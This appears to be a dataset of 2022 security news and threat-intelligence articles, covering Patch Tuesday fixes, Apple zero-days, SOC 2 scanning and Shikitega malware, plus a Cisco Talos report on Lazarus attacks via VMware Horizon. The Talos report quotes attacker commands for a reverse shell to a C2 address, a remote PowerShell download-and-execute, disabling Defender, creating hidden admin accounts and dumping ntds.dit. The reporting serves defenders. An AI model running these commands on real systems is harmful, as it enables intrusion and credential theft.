macOS, and Safari. They also released updates for watchOS and tvOS but provided no details on any of the fixes included in these patches. Two of the bugs patched by Apple were identified as being under active exploit. The first is a kernel bug (CVE-2022-32917) resulting from improper bounds checking. It affects iOS 15 and iPadOS 15, macOS Big Sur, and macOS Monterey. Interestingly, this CVE is also listed in the advisory for iOS 16, but it is not called out as being under active exploit for that flavor of the OS. The Big Sur version of macOS also includes a fix for an Out-of-Bounds (OOB) Write bug in the kernel (CVE-2022-32894) that’s also listed as under active attack. One final note: Apple states in its iOS 16 advisory that “Additional CVE entries to be added soon.” It is possible other bugs could also impact this version of the OS. Either way, it’s time to update your Apple devices. Microsoft Patches for September 2022 This month, Microsoft released 64 new patches addressing CVEs in Microsoft Windows and Windows Components; Azure and Azure Arc; .NET and Visual Studio and .NET Framework; Microsoft Edge (Chromium-based); Office and Office Components; Windows Defender; and Linux Kernel (really). This is in addition to the 15 CVEs patched in Microsoft Edge (Chromium-based) and one patch for side-channel speculation in Arm processors. That brings the total number of CVEs to 79. Five of these CVEs were submitted through the ZDI program. The volume of fixes released this month is about half of what we saw in August, but it is in line with the volume of patches from previous September releases. For whatever reason, the last quarter of the calendar year tends to have fewer patches released. We’ll see if that trend continues in 2022. Of the 64 new CVEs released today, five are rated Critical, 57 are rated Important, one is rated Moderate, and one is rated Low in severity. One of these new CVEs is listed as publicly known and under active attack at the time of release. Let’s take a closer look at some of the more interesting updates for this month, starting with the CLFS bug under active attack: - CVE-2022-37969 - Windows Common Log File System Driver Elevation of Privilege Vulnerability This bug in the Common Log File System (CLFS) allows an authenticated attacker to execute code with elevated privileges. Bugs of this nature are often wrapped into some form of social engineering attack, such as convincing someone to open a file or click a link. Once they do, additional code executes with elevated privileges to take over a system. Usually, we get little information on how widespread an exploit may be used. However, Microsoft credits four different agencies reporting this bug, so it’s likely beyond just targeted attacks. - CVE-2022-34718 - Windows TCP/IP Remote Code Execution Vulnerability This Critical-rated bug could allow a remote, unauthenticated attacker to execute code with elevated privileges on affected systems without user interaction. That officially puts it into the “wormable” category and earns it a CVSS rating of 9.8. However, only systems with IPv6 enabled and IPSec configured are vulnerable. While good news for some, if you’re using IPv6 (as many are), you’re probably running IPSec as well. Definitely test and deploy this update quickly. - CVE-2022-34724 - Windows DNS Server Denial of Service Vulnerability This bug is only rated Important since there’s no chance of code execution, but you should probably treat it as Critical due to its potential impact. A remote, unauthenticated attacker could create a denial-of-service (DoS) condition on your DNS server. It’s not clear if the DoS just kills the DNS service or the whole system. Shutting down DNS is always bad, but with so many resources in the cloud, a loss of DNS pointing the way to those resources could be catastrophic for many enterprises. - CVE-2022-3075 - Chromium: CVE-2022-3075 Insufficient data validation in Mojo This patch was released by the Google Chrome team back on September 2, so this is more of an “in case you missed it.” This vulnerability allows code execution on affected Chromium-based browsers (like Edge) and has been detected in the wild. This is the sixth Chrome exploit detected in the wild this year. The trend shows the near-ubiquitous browser platform has become a popular target for attackers. Make sure to update all of your systems based on Chromium. Here’s the full list of CVEs released by Microsoft for September 2022: * Indicates this CVE had previously been assigned by a 3rd-party and is now being incorporated into Microsoft products. Checking the remaining Critical-rated updates, there are two for Windows Internet Key Exchange (IKE) Protocol Extensions that could also be classified as “wormable.” For both bugs, only systems running IPSec are affected. There are also two Critical-rated vulnerabilities in Dynamics 365 (On-Premises) that could allow an authenticated user to perform SQL injection attacks and execute commands as db_owner within their Dynamics 356 database. Moving on to other code execution bugs, more than half of this month’s release involves some form of remote code execution. Of these, the patches for SharePoint stand out. Microsoft recently detailed how a SharePoint bug was used by Iranian threat actors against the Albanian government, resulting in Albania breaking off diplomatic relations with Iran. Those attacks involved a SharePoint bug we had previously blogged about . These new SharePoint cases do require authentication, but they sound very similar to other SharePoint bugs that came through the ZDI program. There are six RCE bugs in OLE DB Provider for SQL Server, but they require user interaction. A threat actor would need a user on an affected system to connect to a malicious SQL server via OLEDB, which could result in the target server receiving a malicious packet, resulting in code execution. There are five RCE bugs in the ODBC driver that also require user interaction. For these, opening a malicious MDB in Access would get code execution, similar to the other open-and-own bugs in Office components. The bug in LDAP also requires user interaction, but no other information about the exploit scenario is given. The bug in the Enterprise App Management component requires authentication, but it’s still intriguing. An attacker could use the vulnerability to install arbitrary SYSTEM services that would then run with SYSTEM privileges. I could definitely see this bug being used after an initial breach for lateral movement and to maintain a presence on a target network. The RPC bug also looks interesting, but it’s likely not as practical since an attacker would need to spoof the localhost IP address of the target. There’s an RCE bug in .NET, but no information besides the requirement for user interaction is given. Finally, there are updates for the AV1 video extension and the Raw image extension. Both updates are delivered automatically through the Microsoft store. If you’re in a disconnected environment, you’ll need to apply these updates manually. There are a total of 19 elevation of privilege (EoP) fixes in this month’s release, including the aforementioned patch for CLFS. Many of these require an authenticated user to run specially crafted code on an affected system. The bug in Windows Defender for Mac fits this description, as do the kernel-related patches. However, there are a couple of interesting bugs that don’t fit this profile. The first of these is a bug in the Credential Roaming Service that could allow attackers to gain remote interactive logon rights on a machine. There are two bugs in Kerberos that could lead to SYSTEM, but both have many caveats, so exploitation is unlikely. The EoP in Azure Guest Configuration and Arc-Enabled servers is fascinating for multiple reasons. A threat actor could use this vulnerability to replace Microsoft-shipped code with their own code, which would then be run as root in the context of a Guest Configuration daemon. On an Azure Arc-enabled server, it could run in the context of the GC Arc Service or Extension Service daemons. While this is interesting on its own, the mere fact that Microsoft is producing patches for the Linux kernel boggles the mind. And, of course, it wouldn’t be a monthly update if it didn’t include a patch for the print spooler. The September release includes six patches for information disclosure vulnerabilities. For the most part, these only result in leaks consisting of unspecified memory contents. One exception is the bug impacting the Data Protection Application Programming Interface (DPAPI). If you aren’t familiar with it, DPAPI allows you to encrypt data using information from the current user account or computer. The bug patched this month could allow an attacker to view the DPAPI master key. The vulnerability in the Windows graphics component could leak metafile memory values, although it’s not clear what an attacker could do with this information. Seven different DoS vulnerabilities are patched this month, including the DNS bug previously mentioned above. Two bugs in secure channel would allow an attacker to crash a TLS by sending specially crafted packets. There’s a DoS in IKE, but unlike the code execution bugs listed above, no IPSec requirements are listed here. If you’re running newer OSes with the latest features, don’t miss the fix for an HTTP DoS. The system needs HTTP/3 enabled and the server using buffered I/O to be affected. HTTP/3 is a new feature in Windows Server 2022, so in this rare instance, older is better. The September release includes a fix for a lone security feature bypass in Network Device Enrollment (NDES) Service. An attacker could bypass the service’s cryptographic service provider. The Low-rated bug is a sandbox escape in Microsoft Edge (Chromium-based) that requires user interaction. However, the CVSS for this bug is 7.7, which Mitre classifies as “High.” Microsoft claims the user interaction involved justifies the Low rating, but I would still treat this as an important update and not delay the rollout. No new advisories were released this month. The latest servicing stack updates can be found in the revised ADV990001 . Looking Ahead The next Patch Tuesday falls on October 11, and we’ll return with details and patch analysis then. Don’t forget - I’ll be premiering the Patch Report webcast tomorrow on our YouTube channel at 9:00 am Central time. I hope you’re able to tune in and check it out.

The issue, assigned the identifier CVE-2022-32917 , is rooted in the Kernel component and could enable a malicious app to execute arbitrary code with kernel privileges. ""Apple is aware of a report that this issue may have been actively exploited,"" the iPhone maker acknowledged in a brief statement, adding it resolved the bug with improved bound checks. An anonymous researcher has been credited with reporting the shortcoming. It's worth noting that CVE-2022-32917 is also the second Kernel related zero-day flaw that Apple has remediated in less than a month. Patches are available in versions iOS 15.7, iPadOS 15.7 , iOS 16 , macOS Big Sur 11.7 , and macOS Monterey 12.6 . The iOS and iPadOS updates cover iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). With the latest fixes, Apple has addressed seven actively exploited zero-day flaws and one publicly-known zero-day vulnerability since the start of the year - Besides CVE-2022-32917, Apple has plugged 10 security holes in iOS 16, spanning Contacts, Kernel Maps, MediaLibrary, Safari, and WebKit. The iOS 16 update is also notable for incorporating a new Lockdown Mode that's designed to make zero-click attacks harder. iOS further introduces a feature called Rapid Security Response that makes it possible for users to automatically install security fixes on iOS devices without a full operating system update. ""Rapid Security Responses deliver important security improvements more quickly, before they become part of other improvements in a future software update,"" Apple said in a revised support document published on Monday. Lastly, iOS 16 also brings support for passkeys in the Safari web browser, a passwordless sign-in mechanism that allows users to log in to websites and services by authenticating via Touch ID or Face ID.",['Malware'],db392002-a80d-51af-b345-bcd9bbe77a43,"Apple has released another round of security updates to address multiple vulnerabilities in iOS and macOS, including a new zero-day flaw that has been used in attacks in the wild.

635124bc28e9d467ce428332,hackernew,https://thehackernews.com/2022/09/why-vulnerability-scanning-is-critical.html,Why Vulnerability Scanning is Critical for SOC 2,The Hacker News,2022-09-12,"SOC 2 may be a voluntary standard, but for today's security-conscious business, it's a minimal requirement when considering a SaaS provider. Compliance can be a long and complicated process, but a scanner like Intruder makes it easy to tick the vulnerability management box. Security is critical for all organisations, including those that outsource key business operations to third parties like SaaS vendors and cloud providers. Rightfully so, since mishandled data – especially by application and network security providers – can leave organisations vulnerable to attacks, such as data theft, extortion and malware. But how secure are the third parties you've entrusted with your data? SOC 2 is a framework that ensures these service providers securely manage data to protect their customers and clients. For security-conscious businesses – and security should be a priority for every business today – SOC 2 is now a minimal requirement when considering a SaaS provider. SaaS providers understand the benefits of a SOC 2 report for their business, and their customers. It gives them a competitive advantage. It helps continually improve their own security practices. It helps them to meet customer expectations. Most importantly, it gives current and prospective customers peace of mind. They can be confident that the SaaS provider has a rock-solid information security practice in place to keep their data safe and secure. Developed by the American Institute of CPAs ( AICPA ), SOC 2 requires compliance for managing customer data based on five criteria or ""trust service principles"" - security, availability, processing integrity, confidentiality and privacy. It's both a technical audit and a requirement that comprehensive information security policies and procedures are documented and followed. As with all the best compliance certifications and accreditation, it is not just about joining the dots. It involves a complex set of requirements that must be documented, reviewed, addressed and monitored. There are two types or stages: Type 1 and Type 2. A SOC 2 Type 1 report evaluates cybersecurity controls at a single point in time. The goal is to determine whether the internal controls put in place to safeguard customer data are sufficient and designed correctly. Do they fulfil the required criteria? A Type 2 report goes a step further, where the auditor also reports on how effective those controls are. They look at how well the system and controls perform over time (usually 3-12 months). What is their operating effectiveness? Do they work and function as intended? If you think only tech companies like SaaS or cloud service providers need SOC 2 certification, think again. Whatever vertical or industry sector, SOC 2 certification shows your organisation maintains a high level of information security. That's why healthcare providers like hospitals or insurance companies may require a SOC 2 audit to ensure an additional level of scrutiny on their security systems. The same could be said for financial services companies or accountancies that handle payments and financial information. While they may meet industry requirements such as PCI DSS (Payment Card Industry Data Security Standard), they often opt to undergo SOC 2 for additional credibility or if clients insist on it. The rigorous compliance requirements ensure that sensitive information is being handled responsibly. Any organisation that implements the necessary controls are therefore less likely to suffer data breaches or violate users' privacy. This protects them from the negative effects of data losses, such as regulatory action and reputational damage. SOC 2-compliant organisations can use this to prove to customers that they're committed to information security, which in turn can create new business opportunities, because the framework states that compliant organisations can only share data with other organisations that have passed the audit. One control you must pass for your SOC 2 report is vulnerability management. And for that you can use Intruder. Intruder is easy to understand, buy and use. Just sign up and pay by credit card. Job done. You can tick the SOC 2 vulnerability management box in under 10 minutes. Of course, Intruder is also a great tool to use on a day-to-day basis. Not only for its continuous monitoring to ensure your perimeters are secure, but for other scenarios that may require a SOC 2 report such as due diligence. If your business is trying to secure new investment, going through a merger, or being acquired by another business, due diligence will include your security posture, how you handle data, and your exposure to risk and threats. With Intruder, it's easy to prove you take your information security seriously.

WebAttacker is a do-it-yourself (DIY) malware creation kit that became popular back in 2006 . It was the first exploit kit made available to cybercriminals in the Russian underground market for as little as US$20. While you may think it’s no longer active, our research could suggest otherwise. An in-depth look at three email addresses belonging to the WebAttacker operators revealed these findings. A sample of the additional artifacts obtained from our analysis is available for download from our website . We began the investigation by using the email addresses belonging to the WebAttacker operators as reverse WHOIS search strings. That led to the discovery of 346 domains registered between 2011 and 2022, at least five years after the exploit kit was made available in cybercriminal underground markets. The domain registration peaked in 2021. Several of the domains look as if they were randomly generated, such as: A few of them also led to what look to be business sites, specifically rental web pages, based on screenshot lookups . A bulk Threat Intelligence Platform (TIP) malware check, however, showed that only one domain—ddgcc[.]com—was tagged “malicious” by various malware engines. This web property is currently up for sale, so users looking for a domain for their businesses may want to be wary. DNS lookups for the domains showed that they resolved to 135 IP addresses spread out over a dozen countries. A majority of them were geolocated in the U.S., followed by China, Canada, Germany, Japan, and South Africa. Interestingly, while only one domain was dubbed “malicious,” 12 of the IP addresses were tagged as malware hosts by various malware engines, namely: WebAttacker or some variations of it may still live on despite its age. The recently registered domains and the fact that the email addresses identified as IoCs remain in use to this day suggest that.

AT&T has named the malware ""Shikitega"" after finding that it uses the Shikata Ga Nai polymorphic XOR additive feedback encoder from the security penetration testing tool Metasploit, to hide its malicious functionality from anti-virus scans. After performing multiple decoding loops on a very small executable and linkable format program, just 300 bytes in size, Shikitega fetches the Mettle Metasploit meterpreter, developed by security vendor Rapid7. Meterpreters are attack payloads that provide interactive command shells to explore and fully exploit and control target systems. Another ELF binary executes shell commands and addditional files, the researchers said. Files downloaded with this last stage dropper exploits two Linux privilege escalation bugs to obtain root superuser privileges. One of the vulnerabilities, named PwnKit by Qualys, lay undetected in Linux for 12 years. Shikitega adds itself to the system crontab task scheduler, with root privileges, for persistence, and proceeds to download and run the XMRig Monery pseudo-anonymous crypto currency miner.

Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada and Japan. The campaign is meant to infiltrate organizations around the world for establishing long term access and subsequently exfiltrating data of interest to the adversary's nation-state. Talos has discovered the use of two known families of malware in these intrusions — VSingle and YamaBot . Talos has also discovered the use of a recently disclosed implant we're calling "" MagicRAT "" in this campaign. Introduction Cisco Talos observed North Korean state-sponsored APT Lazarus Group conducting malicious activity between February and July 2022. Lazarus has been previously attributed to the North Korean government by the U.S. Cybersecurity and Infrastructure Security Agency (CISA). The entry vectors involve the successful exploitation of vulnerabilities in VMWare products to establish initial footholds into enterprise networks, followed by the deployment of the group's custom malware implants, VSingle and YamaBot . In addition to these known malware families, we have also discovered the use of a previously unknown malware implant we're calling ""MagicRAT."" This campaign was previously partially disclosed by other security firms , but our findings reveal more details about the adversary's modus operandi. We have also observed an overlap of command and control (C2) and payload-hosting infrastructure between our findings and the U.S. Cybersecurity and Infrastructure Security Agency's ( CISA) June advisory that detailed continued attempts from threat actors to compromise vulnerable VMWare Horizon servers. In this research, we illustrate Lazarus Group's post-exploitation tactics, techniques and procedures (TTPs) to establish a foothold, perform initial reconnaissance, deploy bespoke malware and move laterally across infected enterprises. We also provide details about the activities performed by the attackers when the VSingle backdoor is instrumented on the infected endpoints. In this campaign, Lazarus was primarily targeting energy companies in Canada, the U.S. and Japan. The main goal of these attacks was likely to establish long-term access into victim networks to conduct espionage operations in support of North Korean government objectives. This activity aligns with historical Lazarus intrusions targeting critical infrastructure and energy companies to establish long-term access to siphon off proprietary intellectual property. Attribution Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group. During our investigations, we identified three distinct RATs being employed by the threat actors, including VSingle and YamaBot, which are exclusively developed and distributed by Lazarus. The Japanese CERT (JPCERT/CC) recently published reports ( VSingle , YamaBot ), describing them in detail and attributed the campaigns to the Lazarus threat actor. The TTPs used in these attacks also point to the Lazarus threat actor. The initial vector was the exploitation of the Log4j vulnerability on exposed VMware Horizon servers. Successful post-exploitation led to the download of their toolkit from web servers. The same initial vector, URL patterns and similar subsequent hands-on-keyboard activity have been described in this report from AhnLab from earlier this year. There are also overlapping IOCs between the campaign described by AhnLab and the current campaign, such as the IP address 84[.]38.133[.]145 , which was used as a hosting platform for the actors' malicious tools. Although the same tactics have been applied in both attacks, the resulting malware implants deployed have been distinct from one another, indicating the wide variety of implants available at the disposal of Lazarus. Additionally, we've also observed similarities in TTPs disclosed by Kaspersky attributed to the Andariel sub-group under the Lazarus umbrella, with the critical difference being the deployment of distinct malware. While Kaspersky discovered the use of Dtrack and Maui, we've observed the use of VSingle, YamaBot and MagicRAT . Cisco Talos acknowledges that when analyzed individually, the attribution evidence only reaches medium-confidence, however, we're raising our confidence level when analyzing all these points in the context of the campaign and victims. Campaign Cisco Talos has observed several attacks targeting multiple victims. In this section, we detail two specific attack instances that we assess have been the most representative of the playbooks employed by Lazarus in this campaign: Victim 1: Illustrates the kill chain from exploitation to actions on objectives. This intrusion also illustrates the use of the VSingle implant. Victim 2: Represents a kill chain similar to Victim 1 but in this instance, we observed the deployment of a new implant we're calling "" MagicRAT "" along with VSingle. A third intrusion set worth noting here is one where we saw the use of a third bespoke implant known as YamaBot. YamaBot was recently disclosed and attributed to the Lazarus APT by the Japan Computer Emergency Response Team Coordination Center ( JPCERT/CC ). Victim No. 1: VSingle and beyond In the case of the first victim, we observed the exploitation of publicly known vulnerabilities to ultimately deploy the VSingle backdoor on infected endpoints to establish long-term access. In this specific instance, we also observed the actual instrumentation of VSingle implants to carry out additional malicious activities on the infected systems. The flow below provides an overview of the attacker's playbook, which will be detailed in the sections ahead. Exploitation and foothold Cisco Talos identified the exploitation of the Log4Shell vulnerability on VmWare Horizon public-facing servers as the initial attack vector [ T1190 ]. The compromise is followed by a series of activities to establish a foothold [ TA0001 ] on the systems before the attackers deploy additional malware and move laterally across the network. During our investigation, we discovered two different foothold payloads. In the first, the attackers abuse node.exe , which is shipped with VMware to execute the oneliner node.exe script below. C:""Program Files""\VMware""VMware View""\Server\appblastgateway\node.exe -r net -e ""sh = require('child_process').exec(' cmd.exe ');var client = new net.Socket();client.connect(<Port>, '<C2_IP>', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"" This essentially opens an interactive reverse shell that attackers could use to issue arbitrary commands on the infected entry endpoint. In another instance, we observed the attackers exploiting vulnerabilities in VMWare to launch custom PowerShell scripts on the infected endpoint via VMWare's ws_ConnectionServer.exe : powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<remote_location>/<filename>.ps1') Since VMWare Horizon is executed with administrator privileges, the attacker doesn't have to worry about elevating their privileges. After the interactive shell is established, the attackers perform a preliminary reconnaissance on the endpoint to get network information and directory listings [ T1083 ], [ T1590 ], [ T1518 ]: ipconfig /all dir c:""Program Files (x86) dir c:""Program Files The next step is the deactivation of the Windows Defender components [ T1562 ]. This is done through registry key changes, WMIC commands and PowerShell commands. The list below contains the full list of methods Cisco Talos observed. powershell -exec bypass -Command Get-MpPreference powershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /s /f DisableRealtimeMonitoring Once the AV on the system has been bypassed using the reverse shell, the attackers then deploy the actual malware implant from a malware family known to be developed and operated by Lazarus called ""VSingle."" The deployment consists of downloading a copy of the legitimate WinRAR utility from a remote location controlled by the attackers along with an additional payload (archive) [ T1608 ]: powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('<remote_location>\\rar.tmp', '<local_path>\\rar.exe') powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('<remote_location>\\update.tmp <local_path>\\java.tmp') <local_path>\\rar.exe e <local_path>\\java.tmp <local_path_2> -hp!no! The archive downloaded to the infected endpoint is decompressed and consists of the VSingle malware executable which is optionally renamed and then persisted on the endpoint by creating an auto-start service. How is VSingle used? Our investigations led to the discovery of commands fed to the VSingle backdoor by the attackers to carry out a variety of activities such as reconnaissance, exfiltration and manual backdooring. The actor starts by performing additional reconnaissance tasks by running the commands below [ T1083 ], [ T1590 ]. Command Intent systeminfo & ipconfig /all & netstat -naop tcp & tasklist & net user & net view & arp -a System Information Discovery [ T1082 ] query user System Information Discovery [ T1082 ] whoami System Information Discovery [ T1082 ] dir /a %appdata%\microsoft System Information Discovery [ T1082 ] dir /a C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft cmd.exe /u /c dir /a c:\users\administrator System Information Discovery [ T1082 ] cmd /C pwd cmd /C dir cmd /C cd c:\\Users\\<username>\Download & dir cmd /C cd c:\\Users\\<username>\Downloads & dir cmd /C cd c:\\Users\\<username> & dir cmd /C cd c: & dir cmd /C tree c:\\Users System Information Discovery [ T1082 ] cmd.exe /u /c time /t cmd.exe /u /c query session System Information Discovery [ T1082 ] These commands will give the operators a solid understanding of the system they are in, including the installed software, network configuration and system users, among other things. This kind of information is crucial to preparing for lateral movement activities. The attackers also force the system to cache credentials so that it is possible to harvest them afterward [ T1003/005 ]. reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f The other configuration changes made to the victim host are intended to provide the attackers with their own admin-level users [ T1136 ]. Command Intent cmd.exe /u /c net user <userid> <password> /add Create user cmd.exe /u /c reg add HKLM\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist /v <username> /t REG_DWORD /d 0 /f Add privileges cmd.exe /u /c net localgroup Administrators /add <username> cmd.exe /u /c net localgroup Remote Desktop Users /add <username> Add privileges cmd.exe /u /c net localgroup Administrateur /add <username> cmd.exe /u /c net localgroup Administrateurs /add <username> Add privileges cmd.exe /u /c reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f System config - Allow multiple sessions cmd.exe /u /c reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f System config - disable UAC cmd.exe /u /c reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 0 /f System config - LAN Man compatibility These could be used if the RAT is detected/removed or even provide the actors with an RDP access, avoiding the use of a malicious tool. With VSingle in place, the attackers can access other systems with the help of two additional tools. pvhost.tmp renamed to pvhost.exe, which is actually plink.exe, a utility from Putty that can create SSH tunnels between systems. osc.tmp renamed to osc.exe, which we assess with high confidence is 3proxy . Unfortunately, Cisco Talos could not obtain a copy of the file. These two tools working together create a proxy on the victim system which has its listening port ""exported"" to a port on a remote host. This mechanism allows the attacker to have a local proxy port that gives access to the victim network as if the attacker's box was on it directly. First, the attackers start the osc.exe (3proxy) to listen on a loopback port (in this example, we chose 8118), with the command below. C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\osc.exe -i127.0.0.1 -p8118 This alone wouldn't help the attackers, they actually need to have port 8118, exposed on their own network that they can connect to. So, they created an SSH tunnel using Plink , but they forwarded a local port to a remote address, in this case, a remote server controlled by the attackers: C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\pvhost.exe -N -R 18118:127.0.0.1:8118 -P [Port] -l [username] -pw [password] <Remote_IP> The option -R forwards the port 8118 on 127.0.0.1 to the remote server on port 18118 . VSingle RAT Analysis The VSingle loader executable is an MFC-based backdoor that consists of multiple layers. The first is responsible for decoding and executing the next layer (layer 2), a shellcode in the memory of the implant process. The shellcode is simply an injector for the next layer (layer 3, also shellcode). The implant spawns a new "" explorer.exe "" process and injects shellcode (layer 3) into it for execution. The layer 3 shellcode is injected into a newly spawned benign process, such as explorer.exe, which consists of decoding another layer (layer 4) of shellcode that is then executed in the benign process. Layer 4 is the actual VSingle implant DLL loaded reflectively into the memory of the benign process. The implant is simple in terms of functionalities and is basically a stager that enables the attackers to deploy more malware on the infected system. It also includes the ability to open a reverse shell that connects to the C2 server and allows untethered access to the attackers to the endpoint to execute commands via "" cmd.exe ."" Although a rather simple RAT, VSingle can download and execute additional plugins from the C2 server. These plugins can either be in the form of shellcode or script files of specific formats served by the C2. The image below shows the code used to execute a shellcode downloaded. In-memory shellcode execution by the implant. For simpler cases, the implant can receive executables or scripts, save them into a file in the %temp% directory and execute them on the endpoint. The implant supports the .vbs, .bat and .tmp files, since all of them are executed through "" cmd /c. "" The .tmp files can also be loaded as executables (.exe). The implant can achieve persistence for malware artifacts served and specified by the C2 server. The simpler mechanism is the creation of a file in the Startup folders, which is done in two different locations: c:\Documents and Settings\%s\Start Menu\Programs\Startup\%s %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ Additionally, there are three other ways available, all of which use the ""cmd.exe /c"" command, that the VSingle operators can use: Command Intent sc create ""%s"" DisplayName= ""%s"" type= own type= interact start= auto error= ignore binpath= ""cmd.exe /k start \""\"" \""%s\"" Auto start Service Creation [ T1543/003 ] reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v ""%s"" /t REG_SZ /d ""%s"" /f Run registry key [ T1547/001 ] schTasks /Create /F /TN ""%s"" /TR ""%s"" /SC onlogon Scheduled task triggered at logon [ T1053/005 ] schtasks /create /tn <task_name> /tr C:\\Windows\\upsvc.exe /sc onstart /ru System /rl highest /f Scheduled task triggered at system start with high priority [ T1053/005 ] Victim No. 2: The discovery of MagicRAT In another victim's network, we saw a similar chain of events: initial recon followed by disabling the AV software and the deployment of a bespoke implant. We also observed successful lateral movement into other endpoints in the enterprise. What's unique in this intrusion, however, is that we observed the deployment of a fairly new implant three days before the attackers deployed VSingle on the infected systems. This implant called ""MagicRAT"" is outlined in a recently published post . The reverse interactive shell eventually downloads MagicRAT from a remote location. MagicRAT Analysis In this campaign, MagicRAT was configured with a different configuration file and path. It also reported to different C2 servers. The configuration directory is now called "" MagicMon "" in the current user's "" AppData\Roaming "" directory. As seen in the screenshot below, this folder creates and hosts an initialization file named "" MagicSystem.ini ."" This INI file contains several configurations including the list of C2 URLs that can be used by the implant to send and receive commands and data. INI file containing the list of base64 encoded C2 URLs. Lateral Movement During the first few days after the successful initial access, the attackers conducted limited reconnaissance of the endpoint and deployed two different malware families MagicRAT and VSingle on the infected endpoint to maintain covert access to the system. Just like with the first victim, the attackers then started to perform Active Directory (AD) related explorations (via impacket and VSingle) to identify potential endpoints to laterally move into. The table below illustrates the commands executed to perform such actions. Command Intent powershell.exe Get-NetUser 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 User Discovery [ T1033 ] powershell.exe Get-ADDomain 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 Account/Domain Discovery [ T1087 ] powershell.exe Get-ADUser <server> -Properties * 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 User Discovery [ T1033 ] powershell.exe Get-ADUser -Filter * 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 User Discovery [ T1033 ] powershell.exe Get-ADGroup -filter * 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 Account/Domain Discovery [ T1087 ] powershell.exe Get-AdComputer -filter * 1> \\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1 System Information Discovery [ T1082 ] powershell.exe Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem System Information Discovery [ T1082 ] nslookup <remote_computername> Account/Domain Discovery [ T1087 ] powershell.exe Get-WMIObject -Class win32_operatingsystem -Computername <remote_computername> System Information Discovery [ T1082 ] powershell.exe Get-ADUser -Filter * | Select SamAccountName User Discovery [ T1033 ] powershell.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount User Discovery [ T1033 ] powershell.exe Get-AdComputer -Filter * -Properties * | select Name, LastLogonDate, lastLogon, IPv4Address Account/Domain Discovery [ T1087 ] Once the list of computers and users is obtained, the attackers would manually ping specific endpoints in the list to verify if they are reachable (with an occasional tracert). VSingle deployment on new hosts was done by using WMIC to start a remote process. This process was, in fact, a PowerShell snippet that would download VSingle from a remote system [ T1608/001 ]. WMIC /node:<Computer_Name> process call create ""powershell.exe (New-Object System.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\svhostww.exe')"" In some infections, we observed the deployment of impacket tools on other endpoints to move laterally and establish an interactive shell. This stage of the attacks was clearly manual work performed by a human operator. While trying to establish interactive remote console sessions, we can see the operators making errors on the commands. Try # Command Result 1 Enter-PSSession <ComputerName> Failed attempt 2 Enter-PSSession Failed attempt 3 powershell.exe Enter-PSSession Correct command The attackers typically take their time to explore the infected system by obtaining file listings of multiple directories of interest to them. When files of particular interest are found they are put into a .rar archive for exfiltration, typically via one of the custom-developed implants running on the system. Victim No. 3: VSingle makes way for YamaBot During one particular intrusion, the attackers first deployed VSingle on the endpoint. However, after the VSingle sample was detected, the attackers were at risk of losing access to the enterprise. Therefore, after repeated failed attempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle. After maintaining continued access for a while, the attackers then moved on to the use of another implant — YamaBot. YamaBot is a custom-made GoLang-based malware family. It uses HTTP to communicate with its C2 servers. It typically begins by sending preliminary system information about the infected endpoint to the C2: computer name, username and MAC address. YamaBot's helper function names. This implant has standard RAT capabilities, including the ability to: List files and directories. Send process information to C2. Download files from remote locations. Execute arbitrary commands on the endpoints. Uninstall itself. YamaBot was recently attributed to the Lazarus APT group by JPCERT who provided an excellent analysis of the implant. Credential Harvesting Apart from the usual recon and deployment of the custom implants, we also observed Lazarus' use of completely different TTPs for credential harvesting. The attackers created backups of volumes that were then used to create a copy of the "" ntds.dit "" file for exfiltration containing Active Directory data. Command Intent vssadmin list shadows /for=C: ^> <local_path>\<log_file> > <local_path>\execute.bat & C:\Windows\system32\cmd.exe /Q /c <local_path>\execute.bat & del <local_path>\execute.bat System Information Discovery [ T1082 ] vssadmin create shadow /For=C: ^> <local_path>\<log_file> > <local_path>\execute.bat & C:\Windows\system32\cmd.exe /Q /c <local_path>\execute.bat & del <local_path>\execute.bat OS Credential Dumping: NTDS [ T1003/003 ] cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit <local_path>\phPzFvOU.tmp ^> <local_path>\<log_file> > <local_path>\execute.bat & C:\Windows\system32\cmd.exe /Q /c <local_path>\execute.bat & del <local_path>\execute.bat 